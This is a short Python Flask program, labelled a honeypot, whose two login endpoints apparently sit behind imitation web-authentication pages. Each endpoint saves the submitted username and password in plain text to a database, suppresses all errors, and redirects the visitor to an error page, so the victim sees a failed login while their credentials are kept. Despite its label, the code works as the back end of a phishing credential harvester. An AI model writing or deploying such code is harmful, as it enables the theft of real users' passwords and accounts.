#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# Main Program for honeypot
#
# UWSGI: gunicorn -b 127.0.0.1:58088 -w 1 --reload
# UWSGI: --preload --threads 2 -D main:app

from flask import Flask, request, make_response, redirect
from flask_cors import CORS
from dbop import *

global db_session
db_session = conn2db()

app = Flask(__name__)
CORS(app)


@app.route('/api/status', methods=['GET'])
def server_status():
    return make_response('Server is running!', 200)


@app.route('/api/login', methods=['POST'])
def save_net_cred():
    try:
        usrn = request.form['username']
        pasw = request.form['password']
        objt = SrunT(usrname=usrn, passwd=pasw)
        db_session.add(objt)
        db_session.commit()
    except IndexError:
        pass
    except IntegrityError:
        db_session.rollback()
    except:
        pass
    return redirect('/webauth/error.html', 302)


@app.route('/api/uniq/login', methods=['POST'])
def save_uniq_cred():
    try:
        usrn = request.form['username']
        pasw = request.form['password']
        objt = UniqT(usrname=usrn, passwd=pasw)
        db_session.add(objt)
        db_session.commit()
    except IndexError:
        pass
    except IntegrityError:
        db_session.rollback()
    except:
        pass
    return redirect('/uniqauth/error.html', 302)


@app.teardown_appcontext
def shutdown_dbpool(exception=None):
    dbexit(db_session)


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=58088, debug=False)
